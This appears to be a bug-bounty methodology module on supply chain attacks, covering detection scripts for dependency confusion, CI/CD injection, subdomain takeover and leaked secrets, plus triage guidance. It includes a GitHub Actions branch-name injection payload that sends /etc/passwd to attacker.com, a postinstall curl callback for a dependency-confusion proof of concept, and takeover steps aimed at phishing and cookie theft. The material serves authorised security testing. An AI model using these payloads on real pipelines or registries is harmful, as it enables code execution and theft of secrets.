# VULN MODULE — Supply Chain Attacks
# Asset: ALL (webapp, mobileapp, browserext, executable)
# Covers: Dependency Confusion, Typosquatting, Malicious Packages,
#         Lockfile Poisoning, CI/CD Pipeline Injection, Subdomain Takeover
# Report ID prefix: [ASSET]-SC

## THREAT MODEL

Supply chain attacks compromise the build/dependency/delivery pipeline
rather than the application code directly. Impact can be:
  - Code execution in developer environments → credential theft, backdoors
  - Malicious code shipped to production → affects all end users
  - Private package names exposed → dependency confusion possible

This module applies to ALL asset types because every project has dependencies.

## VULNERABILITY CLASSES

1. Dependency Confusion (namespace confusion)  CWE-829  — Critical
2. Typosquatting (similar package names)       CWE-829  — High
3. Lockfile Tampering                          CWE-494  — High
4. CI/CD Pipeline Injection                    CWE-94   — Critical
5. Subdomain Takeover                          CWE-350  — High
6. Malicious Dependency (compromised package)  CWE-1357 — Critical
7. Secrets in Public Repositories              CWE-312  — High
8. Insecure Package Registry Configuration     CWE-346  — Medium

---

## 1. DEPENDENCY CONFUSION

### Theory
If an organization uses a private package registry (npm, PyPI, Maven)
AND a package with the same name exists publicly, npm/pip/Maven
may fetch the PUBLIC (attacker-controlled) version instead.

### Detection — static analysis (all ecosystems)
```bash
# npm / Node.js
cat package.json | python3 -c "
import json,sys
d=json.load(sys.stdin)
deps = {**d.get('dependencies',{}), **d.get('devDependencies',{})}
print('\n'.join(deps.keys()))
" > local_packages.txt

# Check each package name against public npm registry
while read pkg; do
  result=$(curl -s "https://registry.npmjs.org/$pkg" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('name','NOT_FOUND'))" 2>/dev/null)
  if [ "$result" == "NOT_FOUND" ]; then
    echo "[PRIVATE ONLY - CONFUSION CANDIDATE] $pkg"
  fi
done < local_packages.txt

# Python / pip
cat requirements.txt | cut -d'=' -f1 | cut -d'>' -f1 | cut -d'<' -f1 > py_packages.txt
while read pkg; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://pypi.org/pypi/$pkg/json")
  if [ "$status" == "404" ]; then
    echo "[PRIVATE ONLY - CONFUSION CANDIDATE] $pkg"
  fi
done < py_packages.txt

# Java / Maven
grep -rn "<groupId>\|<artifactId>" pom.xml
# Check Maven Central for each dependency

# Ruby / Gems
cat Gemfile | grep "gem '" | awk -F"'" '{print $2}' > gems.txt

# .NET / NuGet
grep -rn "<PackageReference Include=" --include="*.csproj" | grep -oP 'Include="\K[^"]+'
```

### Exploitation (PoC — report only, do NOT publish malicious packages)
```
To demonstrate the finding to the program:
1. Register the private package name on the PUBLIC registry
2. Publish a version with a higher version number than the internal one
   (version: 9999.0.0 ensures it gets picked over the internal 1.2.3)
3. Package postinstall script sends a DNS ping to your collaborator.io callback:
   "scripts": {"postinstall": "curl https://[your-id].oastify.com/dep-confusion"}
4. Report to program: show the DNS callback proving package was fetched
5. IMMEDIATELY unpublish the package after confirmation
```

### .npmrc / pip.conf configuration check
```bash
# If .npmrc exists, check registry configuration
cat .npmrc
# Look for: registry=https://private.registry.com
# Vulnerable if: no --scope or if public registry is ALSO configured as fallback

cat pip.conf  # or ~/.pip/pip.conf
# Look for: index-url or extra-index-url pointing to private registry
# Vulnerable if: extra-index-url includes public PyPI (pip checks both)

# pip-specific: extra-index-url is ALWAYS checked alongside index-url
# This means ANY package name on PyPI with higher version wins
```

---

## 2. TYPOSQUATTING DETECTION

```bash
# Check for common typo variants of your package names
# Tools:
pip install confused
confused -l npm package.json

# Manual check for critical packages
# Common patterns: extra letter, letter swap, hyphen/underscore swap
# Examples: lodash vs 1odash, express vs expresss, react vs recat
```

---

## 3. CI/CD PIPELINE INJECTION

### Detection
```bash
# GitHub Actions
find . -path "./.github/workflows/*.yml" -o -path "./.github/workflows/*.yaml" | \
  xargs grep -l "pull_request_target\|workflow_run"
# pull_request_target runs with WRITE permissions on PR from forks — dangerous

grep -rn "\${{.*github\.event\.pull_request\|github\.head_ref\|github\.event\.issue" \
  .github/workflows/
# User-controlled data interpolated directly into run: steps = injection

# Check for secrets used in untrusted contexts
grep -rn "secrets\." .github/workflows/ -A2
# Are secrets exposed to steps that run user-controlled code?

# GitLab CI
grep -rn "CI_COMMIT_REF_NAME\|CI_MERGE_REQUEST_SOURCE" .gitlab-ci.yml
# User-controlled variables used in shell commands

# CircleCI
grep -rn "CIRCLE_BRANCH\|pipeline.git.branch" .circleci/config.yml
```

### Common injection payload (GitHub Actions)
```yaml
# Vulnerable workflow:
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Branch ${{ github.event.pull_request.head.ref }}"
      # INJECTION: PR from fork with branch name: "; curl attacker.com/$(cat /etc/passwd) #"
```

---

## 4. SUBDOMAIN TAKEOVER

### Detection
```bash
# Find all subdomains
subfinder -d target.com -o subdomains.txt
amass enum -d target.com >> subdomains.txt

# Check each for dangling DNS
while read sub; do
  cname=$(dig +short CNAME $sub)
  if [ -n "$cname" ]; then
    # Check if CNAME target is claimable
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://$cname" 2>/dev/null)
    if echo "$cname" | grep -qE "github\.io|herokuapp|azurewebsites|s3\.amazonaws|netlify"; then
      echo "[CNAME TAKEOVER CANDIDATE] $sub -> $cname (HTTP $status)"
    fi
  fi
done < subdomains.txt

# Services commonly vulnerable to subdomain takeover:
# GitHub Pages, Heroku, Azure, AWS S3, Netlify, Fastly, Shopify, Tumblr
```

### PoC for subdomain takeover
```
1. Identify dangling CNAME: sub.target.com → someuser.github.io (404)
2. Register someuser.github.io by creating a GitHub Pages repo
3. Add CNAME file pointing to sub.target.com
4. Demonstrate: sub.target.com serves attacker content
5. Use for: phishing with trusted domain, cookie theft (if same eTLD+1), CSP bypass
```

---

## 5. SECRETS IN REPOSITORIES

```bash
# Scan git history for secrets
trufflehog git file://. --only-verified

# gitleaks
gitleaks detect --source . -v

# Manual patterns
git log --all --oneline | head -50
git log --all -p | grep -E "password|secret|token|api.key|private.key" -i -B2 -A2

# Check .env files committed by mistake
git log --all --full-history -- "**/.env" "**/*.pem" "**/*.key"
```

---

## TRIAGE NOTES

Dependency Confusion:
  → CRITICAL if package resolution confirmed in CI/CD or developer machines
  → HIGH if package name is available and resolution path plausible
  → Always include DNS callback proof before reporting

CI/CD Injection:
  → CRITICAL if secrets are exfiltrated or production deployment affected
  → HIGH if arbitrary code runs in CI environment
  → Must show actual payload execution, not just theoretical workflow

Subdomain Takeover:
  → HIGH if subdomain is used in OAuth redirect_uri or CSP trusted origin
  → MEDIUM for basic content injection
  → LOW for purely informational subdomain
  → Severity depends entirely on what the subdomain is used for

Typosquatting:
  → Informative unless malicious package already exists on public registry
  → Report only confirmed cases, never theoretical

## TOOLS REFERENCE

```bash
# Dependency confusion
pip install confused
npm install -g snyk

# Subdomain takeover
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
nuclei -t takeovers/ -l subdomains.txt

# Secret scanning
pip install trufflehog
brew install gitleaks

# CI/CD analysis
pip install poutine  # GitHub Actions security scanner
```
